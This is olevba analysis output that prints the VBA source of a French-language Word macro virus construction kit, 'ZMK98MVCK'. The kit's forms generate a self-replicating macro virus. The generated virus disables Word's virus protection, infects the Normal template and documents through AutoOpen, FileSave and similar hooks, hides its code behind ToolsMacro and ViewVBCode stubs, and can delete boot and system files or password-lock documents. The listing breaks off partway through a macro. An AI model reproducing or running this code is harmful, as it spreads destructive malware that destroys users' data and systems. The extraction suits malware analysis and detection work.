olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Constructor.MSWord.Zmk98
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Compilation.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/Compilation'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public ChargeCK As String
Public AssTitre As String
Public AssMess As String
Public MDP As String
Public ChMess As String
Public ChTitre As String
Public Titre3 As String
Public Message3 As String
Public Titre2 As String
Public Message2 As String
Public Titre1 As String
Public Message1 As String
Public MacroNM As String
Public MacroDOC As String
Public VirName As String
Public Fichier As String
Private Sub CommandButton1_Click()
Fichier = Wordbasic.[GetPrivateProfileString$]("FileName", "Fichier", "ZMK98MVCK")
VirName = Wordbasic.[GetPrivateProfileString$]("FileName", "Nom", "ZMK98MVCK")
MacroDOC = Wordbasic.[GetPrivateProfileString$]("MacroType", "NameDOC", "ZMK98MVCK")
MacroNM = Wordbasic.[GetPrivateProfileString$]("MacroType", "NameMN", "ZMK98MVCK")
Titre1 = Wordbasic.[GetPrivateProfileString$]("Message", "MessMECT", "ZMK98MVCK.INI")
Message1 = Wordbasic.[GetPrivateProfileString$]("Message", "MessMECM", "ZMK98MVCK.INI")
Titre2 = Wordbasic.[GetPrivateProfileString$]("Message", "MessMT", "ZMK98MVCK.INI")
Message2 = Wordbasic.[GetPrivateProfileString$]("Message", "MessMM", "ZMK98MVCK.INI")
ChargeCK = Wordbasic.[GetPrivateProfileString$]("MacroPay", "Nom", "ZMK98MVCK.INI")
Open Fichier For Output As #1
    Print #1, "Attribute VB_Name ="""; VirName; ""
    If ChargeCK <> MacroNM And Wordbasic.[GetPrivateProfileString$]("PayType", "Type", "ZMK98MVCK.INI") <> "0" Or ChargeCK <> MacroDOC And Wordbasic.[GetPrivateProfileString$]("PayType", "Type", "ZMK98MVCK.INI") <> "0" Then
    Print #1, "Sub " & ChargeCK
    Print #1, "Application.EnableCancelKey=wdCancelDisabled"
    Print #1, "Wordbasic.DisableAutoMacros 0"
    Print #1, "Options.VirusProtection = False"
    Print #1, "Options.SaveNormalPrompt = False"
    Print #1, "On Error Goto Bye"
    Print #1, "   Call PayLoad"
    Print #1, "Bye:"
    Print #1, "End Sub"
    End If
    Print #1, "Sub " & MacroNM
    Print #1, "'Virus crée par ZMK98MVCK"
    Print #1, "Application.EnableCancelKey=wdCancelDisabled"
    Print #1, "Wordbasic.DisableAutoMacros 0"
    Print #1, "Options.VirusProtection = False"
    Print #1, "Options.SaveNormalPrompt = False"
    Print #1, "On Error Goto Fin"
    Print #1, "iMacroCount= NormalTemplate.VbProject.VbComponent.Count"
    Print #1, "For i=1 to iMacroCount"
    Print #1, "     if NormalTemplate.VbProject.VbComponent(i).Name ="""; VirName; """ Then"
    Print #1, "              " & VirName & "Installed =-1"
    Print #1, "     EndIf"
    Print #1, "Next i"
    Print #1, "If Not " & VirName & "Installed then"
    Print #1, "      Application.OrganizerCopy Source:=ActiveDocument.FullName,Destination:=NormalTemplate.FullName, Name:="""; VirName; """ ,Object:=wdOrganizerObjectProjectItems"
    If MacroDOC = "AutoOpen" Or MacroDOC = "AutoClose" Then
    Print #1, "Else"
    Print #1, "     Application.OrganizerCopy Source:=NormalTemplate.FullName,Destination:=ActiveDocument.FullName, Name:="""; VirName; """ ,Object:=wdOrganizerObjectProjectItems"
    End If
    Print #1, "EndIf"
    If ChargeCK = MacroNM Then
    Print #1, "Call PayLoad"
    End If
    Print #1, "Fin:"
    Print #1, "End Sub"
    If MacroDOC <> MacroNM Then
    Print #1, "Sub " & MacroDOC
    Print #1, "Application.EnableCancelKey=wdCancelDisabled"
    Print #1, "Wordbasic.DisableAutoMacros 0"
    Print #1, "Options.VirusProtection = False"
    Print #1, "Options.SaveNormalPrompt = False"
    Print #1, "On Error Goto Finish"
    If MacroDOC = "FileSave" Then
        Print #1, "ActiveDocument.Save"
    End If
    If MacroDOC = "FileSaveAs" Then
    Print #1, "Dialogs(wdDialogFileSaveAs).Show"
    Print #1, "If ActiveDocument.SaveFormat=wdFormatTemplate or ActiveDocument.SaveFormat=wdFormatDocument then"
    Print #1, "     ActiveDocument.SaveAs FileFormat:=wdFormatTemplate"
    Print #1, "EndIf"
    End If
    If ChargeCK = MacroDOC Then
    Print #1, "Call PayLoad"
    End If
    Print #1, "Application.OrganizerCopy Source:=NormalTemplate.FullName,Destination:=ActiveDocument.FullName, Name:="""; VirName; """ ,Object:=wdOrganizerObjectProjectItems"
    Print #1, "Finish:"
    Print #1, "End Sub"
    End If
    Print #1, "Sub FileTemplates"
    Print #1, "Application.EnableCancelKey=wdCancelDisabled"
    Print #1, "Wordbasic.DisableAutoMacros 0"
    Print #1, "Options.VirusProtection = False"
    Print #1, "Options.SaveNormalPrompt = False"
    Print #1, "On Error Goto ErrorFT"
    If Wordbasic.[GetPrivateProfileString$]("Message", "Choix1", "ZMK98MVCK.INI") = "Oui" Then
    Print #1, "Msgbox """; Message1; """, Title:="""; Titre1; ""
    End If
    Print #1, "ErrorFT:"
    Print #1, "End Sub"
    Print #1, "Sub PayLoad"
    Print #1, "Application.EnableCancelKey=wdCancelDisabled"
    Print #1, "Wordbasic.DisableAutoMacros 0"
    Print #1, "Options.VirusProtection = False"
    Print #1, "Options.SaveNormalPrompt = False"
    Print #1, "On Error Goto ErrorPL"
    If Wordbasic.[GetPrivateProfileString$]("PayType", "Type", "ZMK98MVCK.INI") = "1" Then
        ChMess = Wordbasic.[GetPrivateProfileString$]("PayMess", "MessageM", "ZMK98MVCK.INI")
        ChTitre = Wordbasic.[GetPrivateProfileString$]("PayMess", "MessageT", "ZMK98MVCK.INI")
    Print #1, "   Msgbox """; ChMess; """, Title:="""; ChTitre; ""
    End If
    If Wordbasic.[GetPrivateProfileString$]("PayType", "Type", "ZMK98MVCK.INI") = "2" Then
        If Wordbasic.[GetPrivateProfileString$]("PayDelete", "Fichier1", "ZMK98MVCK.INI") = "Oui" Then
            Print #1, "Kill ""C:\Autoexec.bat"""
        End If
        If Wordbasic.[GetPrivateProfileString$]("PayDelete", "Fichier2", "ZMK98MVCK.INI") = "Oui" Then
            Print #1, "Kill ""C:\Config.sys"""
        End If
        If Wordbasic.[GetPrivateProfileString$]("PayDelete", "Fichier3", "ZMK98MVCK.INI") = "Oui" Then
            Print #1, "Kill ""C:\Command.com"""
        End If
        If Wordbasic.[GetPrivateProfileString$]("PayDelete", "Fichier4", "ZMK98MVCK.INI") = "Oui" Then
            Print #1, "Kill ""C:\Msdos.sys"""
        End If
        If Wordbasic.[GetPrivateProfileString$]("PayDelete", "Fichier5", "ZMK98MVCK.INI") = "Oui" Then
            Print #1, "Kill ""C:\Io.sys"""
        End If
        If Wordbasic.[GetPrivateProfileString$]("PayDelete", "Fichier6", "ZMK98MVCK.INI") = "Oui" Then
            Print #1, "Kill ""C:\Windows\*.ini"""
        End If
        If Wordbasic.[GetPrivateProfileString$]("PayDelete", "Fichier7", "ZMK98MVCK.INI") = "Oui" Then
            Print #1, "Kill CurDir"
        End If
        If Wordbasic.[GetPrivateProfileString$]("PayDelete", "Fichier8", "ZMK98MVCK.INI") = "Oui" Then
            Print #1, "Kill ""C:\Windows\Command\*.*"""
        End If
    End If
    If Wordbasic.[GetPrivateProfileString$]("PayType", "Type", "ZMK98MVCK.INI") = "3" Then
        MDP = Wordbasic.[GetPrivateProfileString$]("PayMDP", "Valeur", "ZMK98MVCK.INI")
        Print #1, "   ActiveDocument.SaveAs Password:="""; MDP; ""
    End If
    If Wordbasic.[GetPrivateProfileString$]("PayType", "Type", "ZMK98MVCK.INI") = "4" Then
    AssTitre = Wordbasic.[GetPrivateProfileString$]("PayAssist", "Titre", "ZMK98MVCK.INI")
    AssMess = Wordbasic.[GetPrivateProfileString$]("PayAssist", "Message", "ZMK98MVCK.INI")
        Print #1, "Assistant.Visible=True"
        Print #1, "With Assistant.NewBalloon"
        Print #1, "     .Button = msoButtonSetOK"
        Print #1, "     .Heading ="""; AssTitre; ""
        Print #1, "     .Text ="""; AssMess; ""
        Print #1, ".Show"
        Print #1, "End With"
    End If
    If Wordbasic.[GetPrivateProfileString$]("PayType", "Type", "ZMK98MVCK.INI") = "0" Then
    End If
    Print #1, "ErrorPL:"
    Print #1, "End Sub"
    Print #1, "Sub ToolsMacro"
    Print #1, "Application.EnableCancelKey=wdCancelDisabled"
    Print #1, "Wordbasic.DisableAutoMacros 0"
    Print #1, "Options.VirusProtection = False"
    Print #1, "Options.SaveNormalPrompt = False"
    Print #1, "On Error Goto ErrorTM"
    If Wordbasic.[GetPrivateProfileString$]("Message", "Choix2", "ZMK98MVCK.INI") = "Oui" Then
    Print #1, "Msgbox """; Message2; """, Title:="""; Titre2; ""
    End If
    Print #1, "ErrorTM:"
    Print #1, "End Sub"
    Print #1, "Sub ViewVBCode"
    Print #1, "Application.EnableCancelKey=wdCancelDisabled"
    Print #1, "Wordbasic.DisableAutoMacros 0"
    Print #1, "Options.VirusProtection = False"
    Print #1, "Options.SaveNormalPrompt = False"
    Print #1, "On Error Goto ErrorVVBC"
    If Wordbasic.[GetPrivateProfileString$]("Message", "Choix3", "ZMK98MVCK.INI") = "Oui" Then
    Print #1, "Msgbox """; Message3; """, Title:="""; Titre3; ""
    End If
    Print #1, "ErrorVVBC:"
    Print #1, "End Sub"
Close #1
Kill ("C:\Windows\ZMK98MVCK.INI")
Unload Compilation
End Sub

Private Sub CommandButton2_Click()
MsgBox "A la prochaine...", Title:="ZMK98MVCK"
Kill ("C:\Windows\ZMK98MVCK.INI")
Tasks.ExitWindows
End Sub

Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileName.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/FileName'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
If TextBox1.Value = "" Then
    MsgBox " Veuillez entrer le nom de votre virus", vbCritical, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "FileName", "Nom", TextBox1.Value, "ZMK98MVCK.INI"
    Unload FileName
End If
If TextBox2.Value = "" Then
    MsgBox "Veuillez entrer le nom du fichier, merci", vbCritical, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "FileName", "Fichier", TextBox2.Value + ".bas", "ZMK98MVCK.INI"
    Unload FileName
End If
End Sub
Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO MacroPay.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/MacroPay'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
If ComboBox1.Value = "AutoExec" Then
    Wordbasic.SetPrivateProfileString "MacroPay", "Nom", ComboBox1.Value, "ZMK98MVCK.INI"
End If
If ComboBox1.Value = "AutoOpen" Then
    Wordbasic.SetPrivateProfileString "MacroPay", "Nom", ComboBox1.Value, "ZMK98MVCK.INI"
End If
If ComboBox1.Value = "AutoClose" Then
    Wordbasic.SetPrivateProfileString "MacroPay", "Nom", ComboBox1.Value, "ZMK98MVCK.INI"
End If
If ComboBox1.Value = "AutoNew" Then
    Wordbasic.SetPrivateProfileString "MacroPay", "Nom", ComboBox1.Value, "ZMK98MVCK.INI"
End If
If ComboBox1.Value = "AutoExit" Then
    Wordbasic.SetPrivateProfileString "MacroPay", "Nom", ComboBox1.Value, "ZMK98MVCK.INI"
End If
Unload MacroPay
End Sub

Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ComboBox1.AddItem "AutoExec"
ComboBox1.AddItem "AutoOpen"
ComboBox1.AddItem "AutoClose"
ComboBox1.AddItem "AutoNew"
ComboBox1.AddItem "AutoExit"
End Sub
-------------------------------------------------------------------------------
VBA MACRO MacroType.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/MacroType'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
If ComboBox1.Value = "" Then
    MsgBox "Veuillez choisir une macro pour infecter le modèle normal", vbCritical, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "MacroType", "NameMN", ComboBox1.Value, "ZMK98MVCK.INI"
    Unload MacroType
End If
If ComboBox1.Value = "" Then
    MsgBox "Veuillez choisir une macro pour infecter les dcouments", vbCritical, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "MacroType", "NameDOC", ComboBox2.Value, "ZMK98MVCK.INI"
    Unload MacroType
End If
End Sub

Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ComboBox1.AddItem "AutoOpen"
ComboBox1.AddItem "AutoClose"
ComboBox1.AddItem "AutoNew"
ComboBox2.AddItem "FileSaveAs"
ComboBox2.AddItem "AutoOpen"
ComboBox2.AddItem "FileSave"
ComboBox2.AddItem "AutoClose"
End Sub
-------------------------------------------------------------------------------
VBA MACRO Message.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/Message'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Unload Message
If ToggleButton1.Value = True Then
    MessMEC.Show
End If
If ToggleButton2.Value = True Then
    MessM.Show
End If
If ToggleButton3.Value = True Then
    MessVBE.Show
End If
End Sub

Private Sub ToggleButton1_Click()
If ToggleButton1.Value = True Then
    ToggleButton1.Caption = "Oui"
    Wordbasic.SetPrivateProfileString "Message", "Choix1", "Oui", "ZMK98MVCK.INI"
End If
If ToggleButton1.Value = False Then
    ToggleButton1.Caption = "Non"
    Wordbasic.SetPrivateProfileString "Message", "Choix1", "Non", "ZMK98MVCK.INI"
End If
End Sub

Private Sub ToggleButton2_Click()
If ToggleButton2.Value = True Then
    ToggleButton2.Caption = "Oui"
    Wordbasic.SetPrivateProfileString "Message", "Choix2", "Oui", "ZMK98MVCK.INI"
End If
If ToggleButton2.Value = False Then
    ToggleButton2.Caption = "Non"
    Wordbasic.SetPrivateProfileString "Message", "Choix2", "Non", "ZMK98MVCK.INI"
End If
End Sub

Private Sub ToggleButton3_Click()
If ToggleButton3.Value = True Then
    ToggleButton3.Caption = "Oui"
    Wordbasic.SetPrivateProfileString "Message", "Choix3", "Oui", "ZMK98MVCK.INI"
End If
If ToggleButton3.Value = False Then
    ToggleButton3.Caption = "Non"
    Wordbasic.SetPrivateProfileString "Message", "Choix3", "Non", "ZMK98MVCK.INI"
End If
End Sub

Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ToggleButton1.Caption = "Non"
ToggleButton2.Caption = "Non"
ToggleButton3.Caption = "Non"
Wordbasic.SetPrivateProfileString "Message", "Choix1", "Non", "ZMK98MVCK.INI"
Wordbasic.SetPrivateProfileString "Message", "Choix2", "Non", "ZMK98MVCK.INI"
Wordbasic.SetPrivateProfileString "Message", "Choix3", "Non", "ZMK98MVCK.INI"
End Sub
-------------------------------------------------------------------------------
VBA MACRO MessM.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/MessM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
If TextBox1.Value = "" Then
    MsgBox "Veuillez entrer le titre de la boîte à message", vbInformation, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "Message", "MessMT", TextBox1.Value, "ZMK98MVCK.INI"
End If
If TextBox2.Value = "" Then
    MsgBox "Veuillez entrer le message à afficher", vbInformation, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "Message", "MessMM", TextBox2.Value, "ZMK98MVCK.INI"
End If
If TextBox1.Value <> "" And TextBox2.Value <> "" Then
    Unload MessM
End If
End Sub

Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO MessMEC.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/MessMEC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
If TextBox1.Value = "" Then
    MsgBox "Veuillez entrer le titre de la boîte à message", vbInformation, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "Message", "MessMECT", TextBox1.Value, "ZMK98MVCK.INI"
End If
If TextBox2.Value = "" Then
    MsgBox "Veuillez entrer le message à afficher", vbInformation, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "Message", "MessMECM", TextBox2.Value, "ZMK98MVCK.INI"
End If
If TextBox1.Value <> "" And TextBox2.Value <> "" Then
    Unload MessMEC
End If
End Sub
Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO MessVBE.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/MessVBE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
If TextBox1.Value = "" Then
    MsgBox "Veuillez entrer le titre de la boîte à message", vbInformation, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "Message", "MessVBET", TextBox1.Value, "ZMK98MVCK.INI"
End If
If TextBox2.Value = "" Then
    MsgBox "Veuillez entrer le message à afficher", vbInformation, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "Message", "MessVBEM", TextBox2.Value, "ZMK98MVCK.INI"
End If
If TextBox1.Value <> "" And TextBox2.Value <> "" Then
    Unload MessVBE
End If
End Sub
Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO PayAssist.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/PayAssist'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
If TextBox1.Value = "" Then
    MsgBox "Veuillez entrer le titre de la bulle de l'assistant", vbInformation, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "PayAssist", "Titre", TextBox1.Value, "ZMK98MVCK.INI"
End If
If TextBox2.Value = "" Then
    MsgBox "Veuillez entrer le message à afficher", vbInformation, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "PayAssist", "Message", TextBox2.Value, "ZMK98MVCK.INI"
End If
If TextBox1.Value <> "" And TextBox2.Value <> "" Then
    Unload PayAssist
End If
End Sub
Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO PayDelete.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/PayDelete'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
If CheckBox1.Value = True Then
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier1", "Oui", "ZMK98MVCK.INI"
Else
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier1", "Non", "ZMK98MVCK.INI"
End If
If CheckBox2.Value = True Then
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier2", "Oui", "ZMK98MVCK.INI"
Else
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier2", "Non", "ZMK98MVCK.INI"
End If
If CheckBox3.Value = True Then
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier3", "Oui", "ZMK98MVCK.INI"
Else
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier3", "Non", "ZMK98MVCK.INI"
End If
If CheckBox4.Value = True Then
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier4", "Oui", "ZMK98MVCK.INI"
Else
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier4", "Non", "ZMK98MVCK.INI"
End If
If CheckBox5.Value = True Then
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier5", "Oui", "ZMK98MVCK.INI"
Else
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier5", "Non", "ZMK98MVCK.INI"
End If
If CheckBox6.Value = True Then
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier6", "Oui", "ZMK98MVCK.INI"
Else
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier6", "Non", "ZMK98MVCK.INI"
End If
If CheckBox7.Value = True Then
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier7", "Oui", "ZMK98MVCK.INI"
Else
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier7", "Non", "ZMK98MVCK.INI"
End If
If CheckBox8.Value = True Then
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier8", "Oui", "ZMK98MVCK.INI"
Else
    Wordbasic.SetPrivateProfileString "PayDelete", "Fichier8", "Non", "ZMK98MVCK.INI"
End If
Unload PayDelete
End Sub
Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Wordbasic.SetPrivateProfileString "PayDelete", "Fichier1", "Non", "ZMK98MVCK.INI"
Wordbasic.SetPrivateProfileString "PayDelete", "Fichier2", "Non", "ZMK98MVCK.INI"
Wordbasic.SetPrivateProfileString "PayDelete", "Fichier3", "Non", "ZMK98MVCK.INI"
Wordbasic.SetPrivateProfileString "PayDelete", "Fichier4", "Non", "ZMK98MVCK.INI"
Wordbasic.SetPrivateProfileString "PayDelete", "Fichier5", "Non", "ZMK98MVCK.INI"
Wordbasic.SetPrivateProfileString "PayDelete", "Fichier6", "Non", "ZMK98MVCK.INI"
Wordbasic.SetPrivateProfileString "PayDelete", "Fichier7", "Non", "ZMK98MVCK.INI"
Wordbasic.SetPrivateProfileString "PayDelete", "Fichier8", "Non", "ZMK98MVCK.INI"
End Sub
-------------------------------------------------------------------------------
VBA MACRO PayMDP.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/PayMDP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
If TextBox1.Value = "" Then
    MsgBox "Veuillez entrer un mot de passe", vbInformation, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "PayMDP", "Valeur", TextBox1.Value, "ZMK98MVCK.INI"
End If
If TextBox2.Value = "" Then
    MsgBox "Veuillez retaper votre mot de passe", vbInformation, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "PayMDP", "Valeur1", TextBox2.Value, "ZMK98MVCK.INI"
End If
If TextBox1.Value = TextBox2.Value And TextBox1.Value <> "" And TextBox2.Value <> "" Then
    Unload PayMDP
Else
    MsgBox "Veuillez retaper votre mot de passe", vbCritical, "ZMK98MVCK"
End If
End Sub
Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO PayMess.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/PayMess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
If TextBox1.Value = "" Then
    MsgBox "Veuillez entrer le titre de la boîte à message", vbInformation, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "PayMess", "MessageT", TextBox1.Value, "ZMK98MVCK.INI"
End If
If TextBox2.Value = "" Then
    MsgBox "Veuillez entrer le message à afficher", vbInformation, "ZMK98MVCK"
Else
    Wordbasic.SetPrivateProfileString "PayMess", "MessageM", TextBox2.Value, "ZMK98MVCK.INI"
End If
If TextBox1.Value <> "" And TextBox2.Value <> "" Then
    Unload PayMess
End If
End Sub

Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub

-------------------------------------------------------------------------------
VBA MACRO PayType.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/PayType'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
If CheckBox1.Value = True Then
    Wordbasic.SetPrivateProfileString "PayType", "Type", "1", "ZMK98MVCK.INI"
    Unload PayType
    PayMess.Show
End If
If CheckBox2.Value = True Then
    Wordbasic.SetPrivateProfileString "PayType", "Type", "2", "ZMK98MVCK.INI"
    Unload PayType
    PayDelete.Show
End If
If CheckBox3.Value = True Then
    Wordbasic.SetPrivateProfileString "PayType", "Type", "3", "ZMK98MVCK.INI"
    Unload PayType
    PayMDP.Show
End If
If CheckBox4.Value = True Then
    Wordbasic.SetPrivateProfileString "PayType", "Type", "4", "ZMK98MVCK.INI"
    Unload PayType
    PayAssist.Show
End If
If CheckBox5.Value = True Then
    Wordbasic.SetPrivateProfileString "PayType", "Type", "0", "ZMK98MVCK.INI"
    Unload PayType
End If
End Sub

Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO Recapitulatif.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/Recapitulatif'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton1_Click()
Unload Recapitulatif
End Sub

Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Dim VirName$, VirFile$, Stealth$, MacroMod$, MacroDOC$, PayType$
VirName$ = Wordbasic.[GetPrivateProfileString$]("FileName", "Nom", "ZMK98MVCK")
VirFile$ = Wordbasic.[GetPrivateProfileString$]("FileName", "Fichier", "ZMK98MVCK")
Stealth$ = Wordbasic.[GetPrivateProfileString$]("Technique", "Furtif", "ZMK98MVCK")
MacroMod$ = Wordbasic.[GetPrivateProfileString$]("MacroType", "NameMN", "ZMK98MVCK")
MacroDOC$ = Wordbasic.[GetPrivateProfileString$]("MacroType", "NameDOC", "ZMK98MVCK")
PayType$ = Wordbasic.[GetPrivateProfileString$]("PayType", "Type", "ZMK98MVCK")
Label3.Caption = VirName$
Label5.Caption = VirFile$
Label7.Caption = "Oui"
Label11.Caption = MacroMod$
Label12.Caption = MacroDOC$
Label14.Caption = PayType$
Label16.Caption = CurDir
End Sub
-------------------------------------------------------------------------------
VBA MACRO Welcome.frm 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/Welcome'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Unload Welcome
End Sub
Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO ZMK98MVCK.bas 
in file: Constructor.MSWord.Zmk98 - OLE stream: 'Macros/VBA/ZMK98MVCK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
    Welcome.Show
    FileName.Show
    MacroType.Show
    Message.Show
    MacroPay.Show
    PayType.Show
    Recapitulatif.Show
    Compilation.Show
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatTemplate Or ActiveDocument.SaveFormat = wdFormatDocument Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "Fonction sub inconnu", vbCritical, "ZMK98MVCK"
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
